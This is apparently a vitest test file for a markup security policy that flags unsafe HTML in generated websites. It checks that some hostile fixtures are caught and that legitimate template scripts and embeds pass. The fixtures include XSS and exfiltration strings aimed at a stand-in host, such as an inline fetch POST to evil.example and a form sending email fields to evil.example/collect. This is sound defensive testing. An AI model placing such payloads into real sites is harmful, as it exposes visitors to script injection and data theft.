import { readdir, readFile, stat } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, test } from 'vitest';
import {
  describeMarkupPolicyViolations,
  findMarkupPolicyIssue,
  findMarkupPolicyViolations,
  GENERATED_HTML_UNSAFE,
  MANAGED_INLINE_SCRIPT_SOURCES,
  siteMarkupPolicy,
  type MarkupViolationRule,
} from '../src/flowstarter/markup-policy';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '../../..');
const templatesRoot = join(repoRoot, 'apps/flowstarter-templates');

const POLICY = siteMarkupPolicy({
  platformOrigins: ['https://flowstarter.dev'],
});

/** A whole page, so the parser sees what a browser would. */
function page(body: string): string {
  return `<!doctype html><html><head><title>Acme</title></head><body>${body}</body></html>`;
}

function rulesFor(body: string): MarkupViolationRule[] {
  return findMarkupPolicyViolations('index.html', page(body), POLICY).map(
    (violation) => violation.rule,
  );
}

describe('findMarkupPolicyViolations — the hostile fixtures', () => {
  test.each<[string, string, MarkupViolationRule]>([
    [
      'an inline script',
      '<script>fetch("https://evil.example", { method: "POST" })</script>',
      'script-inline',
    ],
    [
      'an external script',
      '<script src="https://evil.example/c.js"></script>',
      'script-src',
    ],
    [
      'a same-origin script outside the bundle',
      '<script src="/tracker.js"></script>',
      'script-src',
    ],
    [
      'an inline event handler',
      '<img src="/a.png" onerror="alert(1)">',
      'event-handler',
    ],
    [
      'a javascript: link',
      '<a href="javascript:alert(1)">click</a>',
      'executable-url',
    ],
    [
      'a data: document link',
      '<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>',
      'executable-url',
    ],
    [
      'an iframe',
      '<iframe src="https://evil.example"></iframe>',
      'embedded-frame',
    ],
    [
      'an object',
      '<object data="https://evil.example/x.swf"></object>',
      'embedded-frame',
    ],
    ['an embed', '<embed src="https://evil.example/x.swf">', 'embedded-frame'],
    [
      'a meta refresh',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      'meta-refresh',
    ],
    ['a base tag', '<base href="https://evil.example/">', 'base-tag'],
    [
      'a retargeted contact form',
      '<form action="https://evil.example/collect"><input name="email"></form>',
      'form-action',
    ],
    [
      'a form posting to another route on the platform',
      '<form action="https://flowstarter.dev/api/admin/anything"></form>',
      'form-action',
    ],
    [
      'an external stylesheet',
      '<link rel="stylesheet" href="https://evil.example/s.css">',
      'external-stylesheet',
    ],
  ])('fails %s', (_name, body, rule) => {
    expect(rulesFor(body)).toContain(rule);
  });

  test('fails a service worker registration wherever it appears', () => {
    expect(
      rulesFor('<script>navigator.serviceWorker.register("/sw.js")</script>'),
    ).toContain('service-worker');
    const issue = findMarkupPolicyIssue(
      [
        {
          path: 'dist/_astro/app.js',
          content: 'navigator.serviceWorker.register("/sw.js")',
        },
      ],
      POLICY,
    );
    expect(issue).toContain('service worker');
  });

  test('sees a script the browser would see even when the tag is written oddly', () => {
    // `<script/x>` is a start tag to an HTML parser and a non-match to every
    // pattern anyone ever wrote for `<script>`.
    expect(rulesFor('<script/x>alert(1)</script>')).toContain('script-inline');
  });

  test('looks inside a <template>, which a page can clone into itself', () => {
    expect(
      rulesFor('<template><img src="x" onerror="alert(1)"></template>'),
    ).toContain('event-handler');
  });

  test('names the file, the element and the line in plain words', () => {
    const violations = findMarkupPolicyViolations(
      'contact/index.html',
      page('<form action="https://evil.example/collect"></form>'),
      POLICY,
    );
    const message = describeMarkupPolicyViolations(violations);
    expect(message).toContain(GENERATED_HTML_UNSAFE);
    expect(message).toContain('contact/index.html');
    expect(message).toContain('<form>');
    expect(message).toContain('evil.example');
  });
});

describe('findMarkupPolicyViolations — what a real build ships', () => {
  test("passes the template's own bundle", () => {
    expect(
      rulesFor('<script type="module" src="/_astro/page.abc123.js"></script>'),
    ).toEqual([]);
    // A preview build is emitted under a --base, so the bundle is deeper.
    expect(
      rulesFor(
        '<script type="module" src="/preview/acme/_astro/page.abc123.js"></script>',
      ),
    ).toEqual([]);
  });

  test('passes the layout bootstrap by its exact text', () => {
    for (const source of MANAGED_INLINE_SCRIPT_SOURCES) {
      expect(rulesFor(`<script>${source}</script>`)).toEqual([]);
      expect(rulesFor(`<script>\n      ${source}\n    </script>`)).toEqual([]);
    }
  });

  test('passes the injected lead-capture block by its marker', () => {
    const block =
      '<div class="flowstarter-lead-capture" data-flowstarter-lead-capture="true">' +
      '<script>(function(){var endpoint="https://flowstarter.dev/api/leads/capture/tok";})();</script>' +
      '</div>';
    expect(rulesFor(block)).toEqual([]);
  });

  test('refuses the same script one element outside the managed block', () => {
    expect(
      rulesFor(
        '<div data-flowstarter-lead-capture="true"></div>' +
          '<script>(function(){var endpoint="x";})();</script>',
      ),
    ).toContain('script-inline');
  });

  test('passes the managed booking embed and the contact map', () => {
    expect(
      rulesFor(
        '<div data-flowstarter-cal-embed="true">' +
          '<iframe src="https://cal.com/acme/30min/embed?layout=month_view"></iframe></div>',
      ),
    ).toEqual([]);
    expect(
      rulesFor(
        '<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=1"></iframe>',
      ),
    ).toEqual([]);
  });

  test('passes the fonts, the contact form and JSON-LD', () => {
    expect(
      rulesFor(
        '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish">',
      ),
    ).toEqual([]);
    expect(
      rulesFor('<form action="mailto:hello@acme.example"></form>'),
    ).toEqual([]);
    expect(
      rulesFor(
        '<form action="https://flowstarter.dev/api/leads/capture/tok"></form>',
      ),
    ).toEqual([]);
    expect(rulesFor('<form><input name="email"></form>')).toEqual([]);
    expect(
      rulesFor(
        '<script type="application/ld+json">{"@type":"LocalBusiness"}</script>',
      ),
    ).toEqual([]);
  });

  test('passes an inlined image but not an inlined document', () => {
    expect(
      rulesFor('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">'),
    ).toEqual([]);
    expect(
      rulesFor('<a href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">x</a>'),
    ).toContain('executable-url');
  });
});

/**
 * The templates are the reason the allow-list can be short, so the allow-list
 * is checked against them rather than against a memory of them.
 */
describe('the templates this policy describes', () => {
  async function templateDirs(): Promise<string[]> {
    const entries = await readdir(templatesRoot, { withFileTypes: true });
    return entries
      .filter((entry) => entry.isDirectory())
      .map((entry) => join(templatesRoot, entry.name))
      .sort();
  }

  test('every inline script a layout ships is on the managed list', async () => {
    const collapsed = MANAGED_INLINE_SCRIPT_SOURCES.map((source) =>
      source.split(/\s+/u).join(' ').trim(),
    );
    let checked = 0;
    for (const dir of await templateDirs()) {
      const layout = join(dir, 'src/layouts/Layout.astro');
      let source: string;
      try {
        source = await readFile(layout, 'utf8');
      } catch {
        continue;
      }
      const pattern = /<script\b[^>]*is:inline[^>]*>([\s\S]*?)<\/script>/g;
      for (const match of source.matchAll(pattern)) {
        checked += 1;
        expect(collapsed).toContain(match[1]!.split(/\s+/u).join(' ').trim());
      }
    }
    expect(checked).toBeGreaterThan(0);
  });

  test('every template ships the canonical sanitiser, unmodified', async () => {
    const canonical = await readFile(
      join(
        repoRoot,
        'packages/agentic-codegen/src/flowstarter/site-html-sanitizer.ts',
      ),
      'utf8',
    );
    let checked = 0;
    for (const dir of await templateDirs()) {
      const lib = join(dir, 'src/lib');
      try {
        if (!(await stat(lib)).isDirectory()) continue;
      } catch {
        continue;
      }
      checked += 1;
      const copy = await readFile(join(lib, 'sanitize-html.ts'), 'utf8').catch(
        () => '',
      );
      // Run `node scripts/sync-template-lib.mjs` when this fails.
      expect(copy).toBe(canonical);
    }
    expect(checked).toBeGreaterThan(0);
  });
});
